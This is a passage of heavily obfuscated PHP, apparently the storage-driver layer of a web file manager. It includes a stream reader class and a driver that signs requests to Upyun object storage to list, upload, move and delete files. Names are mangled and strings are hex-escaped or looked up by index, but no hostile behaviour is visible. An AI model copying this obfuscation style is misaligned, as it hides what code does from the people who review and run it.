$¤ç™ù»¸[$¹öØïìÛ[540]] = $íœÃªûµ[$ÃèÊ¯ôï] ? $íœÃªûµ[$ÃèÊ¯ôï] : !1; if (_get($¤ç™ù»¸, $¹öØïìÛ[622], 0)) { $ê§ïİİ = $GLOBALS[$¹öØïìÛ[6]][$¹öØïìÛ[92]][$¹öØïìÛ[623]]; if ($¤ç™ù»¸[$¹öØïìÛ[552]][$¹öØïìÛ[624]] <= time() - $ê§ïİİ) { $this->metaSet($¤ç™ù»¸[$¹öØïìÛ[194]], $¹öØïìÛ[625], null); $this->metaSet($¤ç™ù»¸[$¹öØïìÛ[194]], $¹öØïìÛ[624], null); unset($¤ç™ù»¸[$¹öØïìÛ[552]][$¹öØïìÛ[625]]); continue; } $›²”š–Š = $¤ç™ù»¸[$¹öØïìÛ[552]][$¹öØïìÛ[625]]; $¤ç™ù»¸[$¹öØïìÛ[552]][$¹öØïìÛ[626]] = Model($¹öØïìÛ[610])->getInfoSimpleOuter($›²”š–Š); } } unset($¤ç™ù»¸); } public function parentLevelArray($ÙĞßêøª) { $˜Íó³ªö =& $_SERVER[åÄ¼Ùßš]; $ÙĞßêøª = explode($˜Íó³ªö[50], trim($ÙĞßêøª, $˜Íó³ªö[50])); return array_to_int(array_filter($ÙĞßêøª)); } public function listAll($¥¿Æ„ı) { $£úç÷ğŞ =& $_SERVER[åÄ¼Ùßš]; $û²úšˆ = $this->sourceInfo($¥¿Æ„ı); $¹Æå–òÎ = array($£úç÷ğŞ[627] => array($£úç÷ğŞ[628], $û²úšˆ[$£úç÷ğŞ[597]] . $¥¿Æ„ı . $£úç÷ğŞ[629]), $£úç÷ğŞ[630] => 0); $ı„ôÒ˜ = $£úç÷ğŞ[631]; $²¢ıÍˆ = "\114\x45\x46\x54\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\x69\157\137\146\151\154\x65\40\x66\151\154\x65\40\157\156\x20\x73\157\165\162\143\145\56\146\x69\154\145\111\x44\40\75\x20\x66\x69\x6c\145\x2e\x66\x69\x6c\x65\111\104"; $×Òœİàí = $this->alias($£úç÷ğŞ[530])->field($ı„ôÒ˜)->where($¹Æå–òÎ)->join($²¢ıÍˆ)->select(); $this->_listAppendAuth($×Òœİàí); $this->_listAppendUser($×Òœİàí); $this->_listAppendPath($×Òœİàí); $×Òœİàí = array_to_keyvalue($×Òœİàí, $£úç÷ğŞ[194]); $Òğ Û¢â = "\x2f{$û²úšˆ[$£úç÷ğŞ[32]]}\x2f"; $Òğ Û¢â = $Òğ Û¢â == $£úç÷ğŞ[257] ? $£úç÷ğŞ[8] : $Òğ Û¢â; $ÈÖ™öòÁ = array(); foreach ($×Òœİàí as $Ñüêîª— => $ÈÊÓ²§) { $Ì¤×ôÏë = $this->parentLevelArray($ÈÊÓ²§[$£úç÷ğŞ[597]]); array_shift($Ì¤×ôÏë); $›¸Ë¯Ïœ = $Òğ Û¢â; for ($¿¶ÀÇİ = 0; $¿¶ÀÇİ < count($Ì¤×ôÏë); $¿¶ÀÇİ++) { $›¸Ë¯Ïœ .= $×Òœİàí[$Ì¤×ôÏë[$¿¶ÀÇİ]][$£úç÷ğŞ[32]] . $£úç÷ğŞ[8]; } $›¸Ë¯Ïœ .= $ÈÊÓ²§[$£úç÷ğŞ[32]]; if ($ÈÊÓ²§[$£úç÷ğŞ[497]]) { $›¸Ë¯Ïœ .= $£úç÷ğŞ[8]; } $‚ø–­ûĞ = array($£úç÷ğŞ[507] => str_replace($£úç÷ğŞ[257], $£úç÷ğŞ[8], str_replace($£úç÷ğŞ[257], $£úç÷ğŞ[8], str_replace($£úç÷ğŞ[257], $£úç÷ğŞ[8], $›¸Ë¯Ïœ))), $£úç÷ğŞ[632] => intval($ÈÊÓ²§[$£úç÷ğŞ[497]]), $£úç÷ğŞ[633] => intval($ÈÊÓ²§[$£úç÷ğŞ[79]]), $£úç÷ğŞ[88] => intval($ÈÊÓ²§[$£úç÷ğŞ[88]]), $£úç÷ğŞ[90] => $this->pathInfoFilter($ÈÊÓ²§)); if (!$‚ø–­ûĞ[$£úç÷ğŞ[497]]) { $‚ø–­ûĞ[$£úç÷ğŞ[554]] = $ÈÊÓ²§[$£úç÷ğŞ[554]]; } $ÈÖ™öòÁ[] = $‚ø–­ûĞ; } $ÈÖ™öòÁ = array_sort_by($ÈÖ™öòÁ, $£úç÷ğŞ[87]); return $ÈÖ™öòÁ; } } goto aˆ„·»–Á; b¸ëóÏ¹§: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ÎÛá®Ú, $¸Šã¢Êœ = 0) { parent::__construct(); $this->source = $ÎÛá®Ú; $this->sourceSize = $¸Šã¢Êœ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ƒµÄşí© = false) { return $this->sourceSize; } public function getContent($³­Å¥˜Á = false) { return $this->fileSubstr($³­Å¥˜Á, 0, $this->sourceSize); } public function fileSubstr($òò³¨ = false, $¿ÆÁûÑ¿ = 0, $“à¾—¾ = 0) { if (!$“à¾—¾) { $“à¾—¾ = $this->sourceSize; } $å»ÅĞ‰ = $this->sourceSize - $¿ÆÁûÑ¿; if ($“à¾—¾ >= $å»ÅĞ‰) { $“à¾—¾ = $å»ÅĞ‰; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $¿ÆÁûÑ¿, $“à¾—¾); } if ($this->sourceType == self::TYPE_FILE) { if ($“à¾—¾ <= 0) { return $_SERVER[åÄ¼Ùßš][12]; } $ÌÅõ¢å™ = ftell($this->source); fseek_64($this->source, $ÌÅõ¢å™ + $¿ÆÁûÑ¿); $ş°°‡ƒ‚ = @fread($this->source, $“à¾—¾); fseek_64($this->source, $ÌÅõ¢å™); return $ş°°‡ƒ‚; } } public function hashMd5($ó¶’ğø© = false) { return md5($this->getContent()); } public static function hash($©æâà’½, $•·”Ë¤² = 0) { $ê†Ä´Í¥ = new PathDriverStream($©æâà’½, $•·”Ë¤²); return $ê†Ä´Í¥->hashSimple($©æâà’½); } public static function md5($é¿´€è, $øˆ¢¨É« = 0) { $·Òœ¸”ë = new PathDriverStream($é¿´€è, $øˆ¢¨É«); return $·Òœ¸”ë->hashMd5($é¿´€è); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\x3a\57\57\x76\60\x2e\x61\160\151\56\165\x70\171\165\x6e\56\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($öàÆü›º) { parent::__construct(); $this->_init($öàÆü›º); } public function _init($Ïç©›úÌ) { $®÷°¬ş¶ =& $_SERVER[åÄ¼Ùßš]; foreach ($Ïç©›úÌ as $½‚–ûªÃ => $˜†ˆ‹¥) { if (isset($this->{$½‚–ûªÃ})) { $this->{$½‚–ûªÃ} = $˜†ˆ‹¥; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($®÷°¬ş¶[1590] . LNG($®÷°¬ş¶[1510])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($öŞäœŸÛ, $¤ÓˆÅı• = "\107\105\x54") { $ô¦Ø”Ğ… =& $_SERVER[åÄ¼Ùßš]; $ÍÜŸãóÆ = gmdate($ô¦Ø”Ğ…[1539]); $·Åö¾ÑŠ = base64_encode(hash_hmac($ô¦Ø”Ğ…[1591], "{$¤ÓˆÅı•}\46{$öŞäœŸÛ}\46{$ÍÜŸãóÆ}", md5("{$this->userpass}"), !0)); $„‚°¸ı‰ = array("\x41\x75\164\x68\x6f\x72\151\x7a\141\x74\151\157\x6e\x3a\x55\x50\x59\x55\116\x20{$this->username}\72{$·Åö¾ÑŠ}", "\104\x61\x74\145\x3a{$ÍÜŸãóÆ}"); return $„‚°¸ı‰; } public function ussRequest($†Áä“Ÿı, $ŞãóĞÍë = "\107\x45\x54", $ôâú§‹Ú = false, $¶ÑØŸĞß = false, $ùÎ›ó‰ = false) { $¯§¥éÀÌ =& $_SERVER[åÄ¼Ùßš]; $†Áä“Ÿı = trim($†Áä“Ÿı, $¯§¥éÀÌ[8]); $¦ö‰ŠÕ = "\57{$this->bucket}\57" . rawurlencode($†Áä“Ÿı); $‚ŸßŸî© = $this->ussHeaders($¦ö‰ŠÕ, $ŞãóĞÍë); if ($¶ÑØŸĞß) { $‚ŸßŸî© = array_merge($‚ŸßŸî©, $¶ÑØŸĞß); } $Ş¦”Ãßù = url_request($this->endpoint . $¦ö‰ŠÕ, $ŞãóĞÍë, $ôâú§‹Ú, $‚ŸßŸî©, $ùÎ›ó‰); if (!$Ş¦”Ãßù) { $ƒÕçãŠù = LNG($¯§¥éÀÌ[1592]); $this->writeLog($ƒÕçãŠù); return array($¯§¥éÀÌ[1335] => !1, $¯§¥éÀÌ[1325] => $ƒÕçãŠù); } if (strtolower($ŞãóĞÍë) == $¯§¥éÀÌ[230] || in_array($Ş¦”Ãßù[$¯§¥éÀÌ[1335]], array($¯§¥éÀÌ[264], $¯§¥éÀÌ[1593]))) { $ôâú§‹Ú = $Ş¦”Ãßù[$¯§¥éÀÌ[1594]]; if (!$Ş¦”Ãßù[$¯§¥éÀÌ[843]]) { $ôâú§‹Ú = isset($ôâú§‹Ú[0]) ? $ôâú§‹Ú[0] : $¯§¥éÀÌ[12]; } } else { $ôâú§‹Ú = json_decode($Ş¦”Ãßù[$¯§¥éÀÌ[1325]], !0); if (!$ôâú§‹Ú) { $ôâú§‹Ú = $Ş¦”Ãßù[$¯§¥éÀÌ[1325]]; } else { if (!$Ş¦”Ãßù[$¯§¥éÀÌ[843]] && isset($ôâú§‹Ú[$¯§¥éÀÌ[1595]])) { $ôâú§‹Ú = $ôâú§‹Ú[$¯§¥éÀÌ[1595]]; } } } if (!$Ş¦”Ãßù[$¯§¥éÀÌ[843]]) { $this->writeLog($this->__errorMessage($ôâú§‹Ú)); } return array($¯§¥éÀÌ[1335] => $Ş¦”Ãßù[$¯§¥éÀÌ[843]], $¯§¥éÀÌ[1325] => $ôâú§‹Ú); } private function __errorMessage($œÇ™Ò©Ê) { $òğİ˜Îİ =& $_SERVER[åÄ¼Ùßš]; if (!$œÇ™Ò©Ê) { return $òğİ˜Îİ[12]; } static $ÖÚØŸ… = null; if (!$ÖÚØŸ…) { $ÖÚØŸ… = I18n::getType(); } if ($ÖÚØŸ… != $òğİ˜Îİ[1548]) { return $œÇ™Ò©Ê; } $ŞÕ„¶… = array($òğİ˜Îİ[1596] => $òğİ˜Îİ[1597], $òğİ˜Îİ[1598] => $òğİ˜Îİ[1599], $òğİ˜Îİ[1600] => $òğİ˜Îİ[1599], $òğİ˜Îİ[1601] => $òğİ˜Îİ[1602], $òğİ˜Îİ[1603] => $òğİ˜Îİ[1604], $òğİ˜Îİ[1605] => $òğİ˜Îİ[1606], $òğİ˜Îİ[1607] => $òğİ˜Îİ[1608]); return isset($ŞÕ„¶…[$œÇ™Ò©Ê]) ? $ŞÕ„¶…[$œÇ™Ò©Ê] : $œÇ™Ò©Ê; } public function mkfile($øÌ˜±¦ç, $ƒäï¢ŸŠ = '', $Â„±Õ—Ğ = REPEAT_RENAME) { if ($this->setContent($øÌ˜±¦ç, $ƒäï¢ŸŠ)) { return $this->getPathOuter($øÌ˜±¦ç); } return !1; } public function mkdir($Öåµ¥, $ñ¾Şç† = REPEAT_SKIP) { $ÖÁ×Œ¸° =& $_SERVER[åÄ¼Ùßš]; $ëó¥¨Á = trim($Öåµ¥, $ÖÁ×Œ¸°[8]); if ($this->_isFolder($ëó¥¨Á)) { return $this->getPathOuter($ëó¥¨Á); } $‹É×Î£” = array($ÖÁ×Œ¸°[1609]); $áòÂÃêˆ = $this->ussRequest($ëó¥¨Á, $ÖÁ×Œ¸°[291], !1, $‹É×Î£”); return $áòÂÃêˆ[$ÖÁ×Œ¸°[1335]] ? $this->getPathOuter($ëó¥¨Á) : !1; } public function copyFile($ñÌ§òéâ, $—Ù¬Œû—) { $›Øºêâ‡ =& $_SERVER[åÄ¼Ùßš]; $ï“ˆì¯ø = array($›Øºêâ‡[1610] . "\x2f{$this->bucket}\57{$ñÌ§òéâ}", $›Øºêâ‡[1611]); $®ƒ¡ĞÀï = $this->ussRequest($—Ù¬Œû—, $›Øºêâ‡[256], !1, $ï“ˆì¯ø); return $®ƒ¡ĞÀï[$›Øºêâ‡[1335]] ? !0 : $this->getPathOuter($—Ù¬Œû—); } public function moveFile($¸³–ŞÏ, $££…ñÀ÷) { $Ÿæš²òİ =& $_SERVER[åÄ¼Ùßš]; $¸¹²Å‰Ô = array($Ÿæš²òİ[1612] . "\57{$this->bucket}\x2f{$¸³–ŞÏ}", $Ÿæš²òİ[1611]); $şüç‚¢Ÿ = $this->ussRequest($££…ñÀ÷, $Ÿæš²òİ[256], !1, $¸¹²Å‰Ô); return $şüç‚¢Ÿ[$Ÿæš²òİ[1335]] ? !0 : $this->getPathOuter($££…ñÀ÷); } public function delFile($ÅÇğŒ¼œ) { $Ñ±ßú =& $_SERVER[åÄ¼Ùßš]; $å¤÷Ü˜÷ = $this->ussRequest($ÅÇğŒ¼œ, $Ñ±ßú[1613]); return $å¤÷Ü˜÷[$Ñ±ßú[1335]] ? !0 : !1; } public function delFolder($ˆÇêŠ®˜) { $Äû„Ş¢À =& $_SERVER[åÄ¼Ùßš]; if (!$this->exist($ˆÇêŠ®˜)) { return !0; } $this->listItemCache = !1; $áóŠ«üã = $‚ÉĞˆŒ = array(); $this->fileList($ˆÇêŠ®˜, $áóŠ«üã, $‚ÉĞˆŒ, !0); $this->listItemCache = !0; foreach ($‚ÉĞˆŒ as $‚«É±±’) { $¡¯üÑÉ— = $this->ussRequest($‚«É±±’[$Äû„Ş¢À[32]], $Äû„Ş¢À[1613]); if (!$¡¯üÑÉ—[$Äû„Ş¢À[1335]]) { return !1; } } usort($áóŠ«üã, function ($€×ÌâÑ, $›ƒ–°éî) { $ş„¨´¹ø =& $_SERVER[åÄ¼Ùßš]; return substr_count($›ƒ–°éî, $ş„¨´¹ø[8]) - substr_count($€×ÌâÑ, $ş„¨´¹ø[8]); }); foreach ($áóŠ«üã as $ÁÓºø”) { $¡¯üÑÉ— = $this->ussRequest($ÁÓºø”, $Äû„Ş¢À[1613]); if (!$¡¯üÑÉ—[$Äû„Ş¢À[1335]]) { return !1; } } $¡¯üÑÉ— = $this->ussRequest($ˆÇêŠ®˜, $Äû„Ş¢À[1613]); return $¡¯üÑÉ—[$Äû„Ş¢À[1335]]; } public function rename($ÑáÂ½˜ğ, $ÔˆìÒƒÇ) { if ($this->isFile($ÑáÂ½˜ğ)) { $ÔˆìÒƒÇ = get_path_father($ÑáÂ½˜ğ) . $ÔˆìÒƒÇ; return $this->moveFile($ÑáÂ½˜ğ, $ÔˆìÒƒÇ); } return $this->renameObject($ÑáÂ½˜ğ, $ÔˆìÒƒÇ); } public function fileInfo($µ§›Ëö‰, $­Ï×Ÿ€Ü = false, $¾ıÙñ = array()) { $¦©³öËÜ =& $_SERVER[åÄ¼Ùßš]; $ç³×ı˜ˆ = array($¦©³öËÜ[32] => $this->pathThis($µ§›Ëö‰), $¦©³öËÜ[87] => $this->getPathOuter($¦©³öËÜ[8] . $µ§›Ëö‰), $¦©³öËÜ[33] => $¦©³öËÜ[233], $¦©³öËÜ[79] => isset($¾ıÙñ[$¦©³öËÜ[79]]) ? $¾ıÙñ[$¦©³öËÜ[79]] : 0, $¦©³öËÜ[169] => $this->ext($µ§›Ëö‰)); if ($­Ï×Ÿ€Ü) { return $ç³×ı˜ˆ; } $ç³×ı˜ˆ[$¦©³öËÜ[234]] = $ç³×ı˜ˆ[$¦©³öËÜ[88]] = 0; $ç³×ı˜ˆ[$¦©³öËÜ[235]] = $ç³×ı˜ˆ[$¦©³öËÜ[236]] = !0; if (empty($¾ıÙñ)) { $¾ıÙñ = $this->objectMeta($µ§›Ëö‰); if (!$¾ıÙñ) { return $ç³×ı˜ˆ; } } $ç³×ı˜ˆ[$¦©³öËÜ[234]] = intval($¾ıÙñ[$¦©³öËÜ[1614]]); $ç³×ı˜ˆ[$¦©³öËÜ[88]] = intval($¾ıÙñ[$¦©³öËÜ[1615]]); $ç³×ı˜ˆ[$¦©³öËÜ[79]] = $¾ıÙñ[$¦©³öËÜ[79]]; return $ç³×ı˜ˆ; } public function folderInfo($´Ğ¸à³À, $‘¦ñèí‡ = false) { $‡’Î·ıà =& $_SERVER[åÄ¼Ùßš]; $ŞáˆêƒÍ = array($‡’Î·ıà[32] => $this->pathThis($´Ğ¸à³À), $‡’Î·ıà[87] => $this->getPathOuter($‡’Î·ıà[8] . $´Ğ¸à³À), $‡’Î·ıà[33] => $‡’Î·ıà[78]); if ($‘¦ñèí‡) { return $ŞáˆêƒÍ; } $ŞáˆêƒÍ[$‡’Î·ıà[234]] = $ŞáˆêƒÍ[$‡’Î·ıà[88]] = 0; $ŞáˆêƒÍ[$‡’Î·ıà[235]] = $ŞáˆêƒÍ[$‡’Î·ıà[236]] = !0; if (empty($Ç”º·ºı)) { $Ç”º·ºı = $this->objectMeta($´Ğ¸à³À); if (!$Ç”º·ºı) { return $ŞáˆêƒÍ; } } $ŞáˆêƒÍ[$‡’Î·ıà[234]] = intval($Ç”º·ºı[$‡’Î·ıà[1614]]); $ŞáˆêƒÍ[$‡’Î·ıà[88]] = intval($Ç”º·ºı[$‡’Î·ıà[1615]]); return $ŞáˆêƒÍ; } private function listObjs($èµ¸ÈÎÇ, $ÓË¡Ñ«Â = 0, $ÀˆŠ˜Å­ = 1000) { $èÄ¹ıöò =& $_SERVER[åÄ¼Ùßš]; $ªñ´™Æ = array($èÄ¹ıöò[1616], $èÄ¹ıöò[1617] . $ÀˆŠ˜Å­); if ($ÓË¡Ñ«Â) { $ªñ´™Æ[] = $èÄ¹ıöò[1618] . $ÓË¡Ñ«Â; } $¶çÈß¯³ = $this->ussRequest($èµ¸ÈÎÇ, $èÄ¹ıöò[1541], !1, $ªñ´™Æ); return !$¶çÈß¯³[$èÄ¹ıöò[1335]] ? !1 : $¶çÈß¯³[$èÄ¹ıöò[1325]]; } private function fileList($÷àÌÀà, &$¡¥‡ßŒ¹, &$¯ÔÎçŠË, $ºæ¿•· = false) { $ùá¢Ş€ =& $_SERVER[åÄ¼Ùßš]; $Î¦÷ş¦„ = $ùá¢Ş€[12]; $Ø€«Ó€‘ = 1000; $âŞ üÎ± = rtrim($÷àÌÀà, $ùá¢Ş€[8]) . $ùá¢Ş€[8]; while (!0) { check_abort(); $œš£ìŒí = $this->listObjs($÷àÌÀà, $Î¦÷ş¦„, $Ø€«Ó€‘); if (!$œš£ìŒí) { return !1; } $Î¦÷ş¦„ = isset($œš£ìŒí[$ùá¢Ş€[1619]]) ? $œš£ìŒí[$ùá¢Ş€[1619]] : $ùá¢Ş€[12]; $†¯ùÆï­ = isset($œš£ìŒí[$ùá¢Ş€[1620]]) ? $œš£ìŒí[$ùá¢Ş€[1620]] : array(); foreach ($†¯ùÆï­ as $²·ÉŸˆö) { $‹ ††èß = $²·ÉŸˆö[$ùá¢Ş€[33]] == $ùá¢Ş€[78] ? !0 : !1; $ûÃ™ãÛ¬ = ltrim($âŞ üÎ± . $²·ÉŸˆö[$ùá¢Ş€[32]], $ùá¢Ş€[8]) . ($‹ ††èß ? $ùá¢Ş€[8] : $ùá¢Ş€[12]); $¨¤›œ‚ = array($ùá¢Ş€[32] => $ûÃ™ãÛ¬, $ùá¢Ş€[33] => $‹ ††èß ? $ùá¢Ş€[78] : $ùá¢Ş€[233], $ùá¢Ş€[79] => $²·ÉŸˆö[$ùá¢Ş€[414]], $ùá¢Ş€[1615] => $²·ÉŸˆö[$ùá¢Ş€[1621]]); $this->cacheMethodInfoSet($ûÃ™ãÛ¬, $‹ ††èß, $¨¤›œ‚); if ($‹ ††èß) { $¡¥‡ßŒ¹[] = $ûÃ™ãÛ¬; if ($ºæ¿•·) { $this->fileList($ûÃ™ãÛ¬, $¡¥‡ßŒ¹, $¯ÔÎçŠË, $ºæ¿•·); } continue; } $¯ÔÎçŠË[] = $¨¤›œ‚; } if (count($†¯ùÆï­) < $Ø€«Ó€‘) { break; } } $this->cacheMethodInfoSet($÷àÌÀà, !0); } public function listPath($ĞˆØ±ï§, $èí”«„œ = false) { $µÚÓêÖƒ =& $_SERVER[åÄ¼Ùßš]; $ş¿À³áµ = $¦Èõßæ¬ = array(); $this->fileList($ĞˆØ±ï§, $ş¿À³áµ, $¦Èõßæ¬); foreach ($ş¿À³áµ as $²ü²ŞÖû => $Ø­šø“¾) { $ş¿À³áµ[$²ü²ŞÖû] = $this->folderInfo($Ø­šø“¾, $èí”«„œ); } foreach ($¦Èõßæ¬ as $²ü²ŞÖû => $Ø­šø“¾) { $¦Èõßæ¬[$²ü²ŞÖû] = $this->fileInfo($Ø­šø“¾[$µÚÓêÖƒ[32]], $èí”«„œ, $Ø­šø“¾); } return array($µÚÓêÖƒ[85] => $ş¿À³áµ, $µÚÓêÖƒ[86] => $¦Èõßæ¬); } public function has($ÏüƒÌã¾, $ü¥Š”ÓÂ = false, $‰êéÁõğ = true) { $“«Ş…©Ü =& $_SERVER[åÄ¼Ùßš]; $š‰»Ùà = $“«Ş…©Ü[12]; $›ÌŞ­„ = 500; $§é•¸Æí = 0; $œ¼¤ ·˜ = 0; $ç‚§‹ç = rtrim($ÏüƒÌã¾, $“«Ş…©Ü[8]) . $“«Ş…©Ü[8]; while (!0) { check_abort(); $òß·–©˜ = $this->listObjs($ÏüƒÌã¾, $š‰»Ùà, $›ÌŞ­„); if (!$òß·–©˜) { return !1; } $š‰»Ùà = isset($òß·–©˜[$“«Ş…©Ü[1619]]) ? $òß·–©˜[$“«Ş…©Ü[1619]] : $“«Ş…©Ü[12]; $ôÔ·Œ¨ = isset($òß·–©˜[$“«Ş…©Ü[1620]]) ? $òß·–©˜[$“«Ş…©Ü[1620]] : array(); if (empty($ôÔ·Œ¨)) { break; } $“îùÒ©Ü = array_filter($ôÔ·Œ¨, function ($…õˆİÀ­) { $ÚššÑõ£ =& $_SERVER[åÄ¼Ùßš]; return $…õˆİÀ­[$ÚššÑõ£[33]] == $ÚššÑõ£[78]; }); $Ç•´Áßª = count($ôÔ·Œ¨); $“îùÒ©Ü = count($“îùÒ©Ü); $‰ğ± Œş = $Ç•´Áßª - $“îùÒ©Ü; if ($ü¥Š”ÓÂ) { $œ¼¤ ·˜ += $“îùÒ©Ü; $§é•¸Æí += $‰ğ± Œş; if ($Ç•´Áßª < $›ÌŞ­„) { break; } continue; } if ($‰êéÁõğ) { if ($‰ğ± Œş) { return !0; } } else { if ($“îùÒ©Ü) { return !0; } } if ($Ç•´Áßª < $›ÌŞ­„) { break; } } if ($ü¥Š”ÓÂ) { return array($“«Ş…©Ü[242] => $§é•¸Æí, $“«Ş…©Ü[243] => $œ¼¤ ·˜); } return !1; } public function listAll($’±à²‹É) { $ŒŒÇùÍü =& $_SERVER[åÄ¼Ùßš]; $³ßÕÑ = $Ñ‰¬³¿ş = array(); $this->fileList($’±à²‹É, $³ßÕÑ, $Ñ‰¬³¿ş, !0); $î€‡ÅÒõ = array_to_keyvalue($Ñ‰¬³¿ş, $ŒŒÇùÍü[32]); foreach ($³ßÕÑ as $Ùß±”) { if (is_string($Ùß±”)) { $î€‡ÅÒõ[$Ùß±”] = array($ŒŒÇùÍü[79] => 0); } } return $this->listAllFiles($’±à²‹É, $î€‡ÅÒõ); } public function canRead($®Ã¢¸ºÜ) { return $this->exist($®Ã¢¸ºÜ) ? !0 : !1; } public function canWrite($‚Œá‹ç«) { return $this->exist($‚Œá‹ç«) ? !0 : !1; } public function getContent($é¿‚Ë‡‡) { return $this->fileSubstr($é¿‚Ë‡‡, 0, -1); } public function setContent($®ªû¤¼, $ùÕ¥Ó¯— = '') { $ÎÍù…Û” =& $_SERVER[åÄ¼Ùßš]; if (!$ùÕ¥Ó¯—) { $¦ó„áÖª = $this->ussRequest($®ªû¤¼, $ÎÍù…Û”[291]); return $¦ó„áÖª[$ÎÍù…Û”[1335]]; } $Å¤èĞÄ = $this->tempFile($this->pathThis($®ªû¤¼)); file_put_contents($Å¤èĞÄ, $ùÕ¥Ó¯—); if ($this->upload($®ªû¤¼, $Å¤èĞÄ)) { $this->tempFileRemve($Å¤èĞÄ); return !0; } return !1; } public function fileSubstr($¨ÖçÈˆ•, $µˆıŠ†„, $ß¿¯Á®Æ) { $ÏââÛ‚ô =& $_SERVER[åÄ¼Ùßš]; if (!($¹ï¼œÖÚ = $this->link($¨ÖçÈˆ•))) { return !1; } $‘äàÀ¤ = !1; if ($ß¿¯Á®Æ > 0) { $ıÍŒ¦øÛ = $µˆıŠ†„ + $ß¿¯Á®Æ - 1; $‘äàÀ¤ = array($ÏââÛ‚ô[1580] . $µˆıŠ†„ . $ÏââÛ‚ô[474] . $ıÍŒ¦øÛ); } $˜Óí½ìï = url_request($¹ï¼œÖÚ, $ÏââÛ‚ô[1541], !1, $‘äàÀ¤); return $˜Óí½ìï[$ÏââÛ‚ô[843]] ? $˜Óí½ìï[$ÏââÛ‚ô[1325]] : !1; } public function upload($µ³ûıÔã, $òŠ—½À³, $Ç·¤•Çâ = false, $ğ˜¾ƒ¤ = REPEAT_REPLACE) { $Ë‡¯” =& $_SERVER[åÄ¼Ùßš]; $Ç¾²÷æ = IO::size($òŠ—½À³); if ($Ç¾²÷æ <= 1024 * 1024 * 200) { $¶áçı¹Æ = array($Ë‡¯”[1622] . $òŠ—½À³); $Š›íèğ¾ = $this->ussRequest($µ³ûıÔã, $Ë‡¯”[256], $¶áçı¹Æ); return $Š›íèğ¾[$Ë‡¯”[1335]] ? $this->getPathOuter($µ³ûıÔã) : !1; } $Ã‹ƒ¾¥É = 1024 * 1024 * 10; $­ÌĞâ¿ = array($Ë‡¯”[1623], $Ë‡¯”[1624] . $Ç¾²÷æ, $Ë‡¯”[1625], $Ë‡¯”[1626] . $Ã‹ƒ¾¥É); $Š›íèğ¾ = $this->ussRequest($µ³ûıÔã, $Ë‡¯”[256], !1, $­ÌĞâ¿); if (!$Š›íèğ¾[$Ë‡¯”[1335]]) { return !1; } $–¯â¼Ğ  = $Š›íèğ¾[$Ë‡¯”[1325]]; $ı¼¡ şö = 0; $×ŒÊŠÂÍ = $–¯â¼Ğ [$Ë‡¯”[1627]]; $¤Úñ‰Ë´ = fopen($òŠ—½À³, $Ë‡¯”[1504]); if (!$¤Úñ‰Ë´) { return !1; } do { $®‚œìºÇ = $–¯â¼Ğ [$Ë‡¯”[1628]]; fseek_64($¤Úñ‰Ë´, $ı¼¡ şö); $œ¯¤¸¿¦ = fread($¤Úñ‰Ë´, $®‚œìºÇ); $ŠôıÇÃè = 0; do { $ŠôıÇÃè++; $–¯â¼Ğ  = $this->uploadPart($µ³ûıÔã, $–¯â¼Ğ , $œ¯¤¸¿¦); } while (!$–¯â¼Ğ  && $ŠôıÇÃè < 3); if (!$–¯â¼Ğ ) { return !1; } $×ŒÊŠÂÍ = $–¯â¼Ğ [$Ë‡¯”[1627]]; $ı¼¡ şö += $®‚œìºÇ; } while ($×ŒÊŠÂÍ != -1); fclose($¤Úñ‰Ë´); $­ÌĞâ¿ = array($Ë‡¯”[1629], $Ë‡¯”[1630] . $–¯â¼Ğ [$Ë‡¯”[1631]], $Ë‡¯”[1625]); $Š›íèğ¾ = $this->ussRequest($µ³ûıÔã, $Ë‡¯”[256], !1, $­ÌĞâ¿); return $Š›íèğ¾[$Ë‡¯”[1335]] ? $this->getPathOuter($š™Ê‘³¯) : !1; } private function uploadPart($ÓòØ·ëÏ, $¢¹àÆ¯ì, &$öíóê××) { $²‡¿–’å =& $_SERVER[åÄ¼Ùßš]; $›èò»ÎÈ = array($²‡¿–’å[1632], $²‡¿–’å[1630] . $¢¹àÆ¯ì[$²‡¿–’å[1631]], $²‡¿–’å[1633] . $¢¹àÆ¯ì[$²‡¿–’å[1627]], $²‡¿–’å[146] . $¢¹àÆ¯ì[$²‡¿–’å[1628]]); $Õºğå– = $this->ussRequest($ÓòØ·ëÏ, $²‡¿–’å[256], $öíóê××, $›èò»ÎÈ); return !$Õºğå–[$²‡¿–’å[1335]] ? $Õºğå–[$²‡¿–’å[1335]] : $Õºğå–[$²‡¿–’å[1325]]; } public function uploadFormData($ê„àªÅ•, $ˆƒÎøÎÉ = 3600) { return $this->uploadPolicy($ê„àªÅ•, $ˆƒÎøÎÉ); } public function uploadMultiData($»÷ïŞÖ¹, $äî È•‡ = 3600) { $óÇ˜ôŠ€ =& $_SERVER[åÄ¼Ùßš]; $²ûÜ­Å§ = (int) $GLOBALS[$óÇ˜ôŠ€[7]][$óÇ˜ôŠ€[79]]; return $this->uploadPolicy($»÷ïŞÖ¹, $äî È•‡, $²ûÜ­Å§); } private function uploadPolicy($©‰¸¹¤¸, $äûæö¶— = 3600, $Îï·®Æ = 0) { $ôÍ¸ÔÌ =& $_SERVER[åÄ¼Ùßš]; $ÏîìæÑÖ = $ôÍ¸ÔÌ[8] . $this->bucket; $ïÙ˜•ß« = gmdate($ôÍ¸ÔÌ[1539]); $³Ÿ›õØ± = array($ôÍ¸ÔÌ[1634] => $this->bucket, $ôÍ¸ÔÌ[1635] => $©‰¸¹¤¸, $ôÍ¸ÔÌ[1636] => time() + $äûæö¶—, $ôÍ¸ÔÌ[1637] => $ïÙ˜•ß«); if ($Îï·®Æ) { $³Ÿ›õØ±[$ôÍ¸ÔÌ[1524]] = $Îï·®Æ; } $ŒŒå”´Ó = base64_encode(json_encode($³Ÿ›õØ±)); $í—ş…â = base64_encode(hash_hmac($ôÍ¸ÔÌ[1591], 